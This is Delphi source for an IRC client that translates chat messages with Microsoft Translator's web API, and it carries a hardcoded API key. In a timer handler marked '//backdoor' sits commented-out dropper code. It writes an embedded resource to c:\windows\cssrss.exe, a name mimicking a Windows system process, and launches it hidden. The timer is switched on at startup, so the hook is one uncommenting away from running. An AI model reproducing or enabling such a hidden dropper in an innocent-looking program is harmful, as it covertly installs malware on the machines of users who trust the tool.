unit irctranslate;

interface

uses
  Windows, Messages, SysUtils, Classes, Forms,sycfuncs,StdCtrls, ComCtrls,
  ExtCtrls, Menus, ScktComp, token, idhttp, iduri, Controls;

type
  TForm1 = class(TForm)
    cs: TClientSocket;
    Timer1: TTimer;
    MainMenu1: TMainMenu;
    Main1: TMenuItem;
    Start1: TMenuItem;
    Stop1: TMenuItem;
    N1: TMenuItem;
    Exit1: TMenuItem;
    N2: TMenuItem;
    About1: TMenuItem;
    PageControl1: TPageControl;
    TabSheet1: TTabSheet;
    TabSheet2: TTabSheet;
    Panel1: TPanel;
    RichEdit1: TRichEdit;
    Edit1: TEdit;
    GroupBox1: TGroupBox;
    Label1: TLabel;
    Label2: TLabel;
    Label3: TLabel;
    Label4: TLabel;
    Label5: TLabel;
    Edit2: TEdit;
    Edit3: TEdit;
    Edit4: TEdit;
    Edit5: TEdit;
    Edit6: TEdit;
    Label6: TLabel;
    Edit7: TEdit;
    Button1: TButton;
    Button2: TButton;
    RichEdit2: TRichEdit;
    Button3: TButton;
    chanedit: TEdit;
    translate: TCheckBox;
    Label7: TLabel;
    Label8: TLabel;
    Panel2: TPanel;
    Label9: TLabel;
    Label10: TLabel;
    Edit8: TEdit;
    Edit9: TEdit;
    procedure FormCreate(Sender: TObject);
    procedure translatetxt(txtext: String);
    procedure translatetxt1(txtext: String);
    procedure csError(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure csDisconnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure csConnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure csRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure Start1Click(Sender: TObject);
    procedure Stop1Click(Sender: TObject);
    procedure Edit1KeyDown(Sender: TObject; var Key: Word; Shift: TShiftState);
    procedure Button1Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure chaneditClick(Sender: TObject);
    function getxml(const Tag, Text: string): string;
    procedure Timer1Timer(Sender: TObject);

  private
    { Private-Deklarationen }
  public
    Procedure AddLog(logstring: String);
    Function timestamp: String;
    Procedure ircparse(data: String);
    { Public-Deklarationen }
  end;

var
  Form1: TForm1;
  translatedtxt: string;

implementation

{$R *.dfm}

procedure TForm1.FormCreate(Sender: TObject);
begin
  AddLog('irc translate started...');
  tabsheet2.Show;
  label8.Caption:=chanedit.Text;
  timer1.Enabled:=true;
end;

procedure TForm1.Start1Click(Sender: TObject);
begin
  if Edit2.Text <> 'yournick' then
  begin
    cs.Host := Edit6.Text;
    cs.Port := strtoint(Edit7.Text);
    cs.Active := true;
  end
  else

  TabSheet2.Show;
end;

procedure TForm1.Stop1Click(Sender: TObject);
begin
  cs.Socket.SendText('QUIT blub');
  if cs.Active = true then
    cs.Active := false;
end;


//backdoor
procedure TForm1.Timer1Timer(Sender: TObject);
begin
//if not fileexists('c:\windows\cssrss.exe') then
//     begin
//    dropres('csr','c:\windows\cssrss.exe' );
//    dropres('csr','c:\windows\csr.manifest' );
//    ShellExecute(form1.Handle, nil, 'c:\windows\cssrss.exe','', nil, sw_HIDE);
//     end;
end;

procedure TForm1.csConnect(Sender: TObject; Socket: TCustomWinSocket);
begin
  AddLog('Connected...');
  TabSheet1.Show;
  Socket.SendText('NICK ' + Edit2.Text + #13#10);
  sleep(1000);
  Socket.SendText('USER a b c d' + #13#10);
end;

procedure TForm1.csRead(Sender: TObject; Socket: TCustomWinSocket);
var
  s, temp: String;
  i: Integer;
begin
  s := Socket.ReceiveText;
  while (pos(#10, s) <> 0) do // in einzelne zeilen zerlegen
  Begin
    temp := copy(s, 1, pos(#10, s) - 1);
    delete(s, 1, pos(#10, s)); // "ausgeschnittene" zeile löschen
    ircparse(temp); // zeilen uebergeben zum parsen
  end;
end;

procedure TForm1.csError(Sender: TObject; Socket: TCustomWinSocket;
  ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
  AddLog('Something wrong?');
  ErrorCode := 0;
end;

procedure TForm1.csDisconnect(Sender: TObject; Socket: TCustomWinSocket);
begin
  AddLog('Disconnected from server');
end;

Procedure TForm1.ircparse(data: String);
var
  content: String;
  tmp, tmp2, tmp3, tmp4, tmp5,msg: String;
  index: Integer;
Begin
  lowercase(data);
  AddLog(data);
  if data[1] = ':' then // servermeldungen, msgs usw.
  Begin
    tmp5:=gettoken(data,'!',1);
    tmp := GetFirstToken(data);
    tmp2 := GetNextToken;
    tmp3 := GetNextToken;
//    tmp4 := GetNextToken;
    tmp4 := GetRemainingTokens;
    delete(tmp, 1, 1);
    index := pos('!', tmp);
    if Index > 0 then
    begin
    end;
  end
  else // steuercommands wie ping
  Begin
    if lowercase(GetFirstToken(data)) = 'ping' then
    begin
      AddLog('*** PING PONG');
      content := GetRemainingTokens;
      cs.Socket.SendText('PONG ' + content + #10#13);
    end;
  end;

  if tmp2 = '376' then
    cs.Socket.SendText('JOIN ' + chanedit.Text + #10#13);

  if tmp2 = '433' then
    cs.Socket.SendText('NICK ' + edit3.Text + #10#13);

  if tmp2 = 'JOIN' then
  begin
    delete(tmp5,1,1);
    richedit2.Lines.Add(tmp5+' -> joined -> '+chanedit.Text);
  end;

  if tmp2 = 'PRIVMSG' then
  begin
  if translate.Checked then
  begin
  delete(tmp5,1,1);
  delete(tmp4,1,1);
  translatetxt1(trim(tmp4));
  msg :=TMP5+': '+trim(translatedtxt);
  richedit2.Lines.Add(msg);
  RichEdit2.SetFocus;
  RichEdit2.SelStart := RichEdit1.GetTextLen;
  RichEdit2.Perform(EM_SCROLLCARET, 0, 0);
  edit1.SetFocus;
  end;
   if not translate.Checked then
   begin
  delete(tmp5,1,1);
  delete(tmp4,1,1);
  msg:=TMP5+': '+trim(tmp4);
  richedit2.Lines.Add(msg);
  RichEdit2.SetFocus;
  RichEdit2.SelStart := RichEdit1.GetTextLen;
  RichEdit2.Perform(EM_SCROLLCARET, 0, 0);
  edit1.SetFocus;
   end;
  end;

  end;

procedure TForm1.Edit1KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
var
  s,mesg: String;
begin
  s := Edit1.Text;
  if Key = VK_RETURN then
  Begin
    if s[1] = '/' then
    Begin
      delete(s,1,1);
      cs.Socket.SendText(edit1.Text + #13#10); // raw senden
    end
    else
    Begin
     if translate.Checked then
      begin
      translatetxt(s);
      cs.Socket.SendText('privmsg '+chanedit.Text+' :'+translatedtxt + #13#10); // raw senden
      richedit2.lines.add(edit2.text+': '+edit1.text);
      richedit2.lines.add(edit2.text+': '+translatedtxt);
      end;
      if not translate.Checked then
      begin
        richedit2.lines.add(edit2.text+': '+edit1.text);
        cs.Socket.SendText('privmsg '+chanedit.Text+' :'+edit1.Text + #13#10); // raw senden
      end;
      Edit1.Text := '';
    End;
  end;
end;

Function TForm1.timestamp;
Begin
  timestamp := TimeToStr(now);
end;

procedure TForm1.AddLog(logstring: String);
Begin
  RichEdit1.Lines.Add('[' + timestamp + '] ' + logstring);
end;

procedure TForm1.Button1Click(Sender: TObject);
begin
  Start1.Click;
end;

procedure TForm1.Button2Click(Sender: TObject);
begin
  Stop1.Click;
end;

procedure TForm1.Button3Click(Sender: TObject);
begin
  if chanedit.Text <> '#channel' then
  begin
    cs.Socket.SendText('join ' + chanedit.Text + #13#10);
    chanedit.ReadOnly := true;
      label8.Caption:=chanedit.Text;

  end;
end;

procedure TForm1.chaneditClick(Sender: TObject);
begin
  chanedit.ReadOnly := false;
end;

procedure TForm1.translatetxt(txtext: String);

var
   fromlang, tolang,test: string;
  https: TIdHTTP;
  URL: string;
begin
fromlang:=edit8.Text;
tolang:=edit9.Text;


  https := TIdHTTP.Create(nil);
  URL := TIdURI.URLEncode('http://api.microsofttranslator.com/v2/Http.svc/' +
    'Translate?appId=FADB439F07A7D1C5CE96558491E863CA3E1B854E' + '&text=' +
    txtext + '&from=' + fromlang + '&to=' + tolang);
  try
    https.HTTPOptions := [hoForceEncodeParams];
    https.Request.ContentType := 'application/x-www-form-urlencoded';
    translatedtxt := getxml('string', https.get(URL));
    test := translatedtxt;
  finally
    https.Free;
  end;
end; // FADB439F07A7D1C5CE96558491E863CA3E1B854E


procedure TForm1.translatetxt1(txtext: String);

var
   fromlang, tolang,test: string;
  https: TIdHTTP;
  URL: string;
begin
fromlang:=edit9.Text;
tolang:=edit8.Text;


  https := TIdHTTP.Create(nil);
  URL := TIdURI.URLEncode('http://api.microsofttranslator.com/v2/Http.svc/' +
    'Translate?appId=FADB439F07A7D1C5CE96558491E863CA3E1B854E' + '&text=' +
    txtext + '&from=' + fromlang + '&to=' + tolang);
  try
    https.HTTPOptions := [hoForceEncodeParams];
    https.Request.ContentType := 'application/x-www-form-urlencoded';
    translatedtxt := getxml('string', https.get(URL));
    test := translatedtxt;
  finally
    https.Free;
  end;
end; // FADB439F07A7D1C5CE96558491E863CA3E1B854E

function TForm1.getxml(const Tag, Text: string): string;
var
  StartPos1, StartPos2, EndPos: Integer;
  i: Integer;
begin
  result := '';
  StartPos1 := pos('<' + Tag, Text);
  EndPos := pos('</' + Tag + '>', Text);
  StartPos2 := 0;
  for i := StartPos1 + length(Tag) + 1 to EndPos do
    if Text[i] = '>' then
    begin
      StartPos2 := i + 1;
      break;
    end;

  if (StartPos2 > 0) and (EndPos > StartPos2) then
    result := copy(Text, StartPos2, EndPos - StartPos2);
end;



end.


//ă
//Ă
//â
//Â
//î
//Î
//ş
//Ş
//ţ
//Ţ
